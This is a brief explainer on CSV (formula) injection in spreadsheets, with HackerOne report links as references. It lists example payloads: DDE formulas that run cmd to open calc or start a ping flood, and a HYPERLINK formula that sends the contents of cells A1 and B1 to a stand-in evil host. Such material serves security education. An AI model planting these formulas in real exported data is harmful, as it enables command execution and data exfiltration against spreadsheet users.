# What is a CSV injection attack?
When user input gets passed through a spreadsheet sofrware without santization
it can execute excel codes like 

```bash
=4+4
=cmd|'/C calc'!A0
=HYPERLINK(“http://MyExtremelyEvilSite.com?leak=”&A1&” “&B1)
=cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'
```

REFERENCE : 
https://hackerone.com/reports/386116
https://hackerone.com/reports/118582
https://hackerone.com/reports/459532




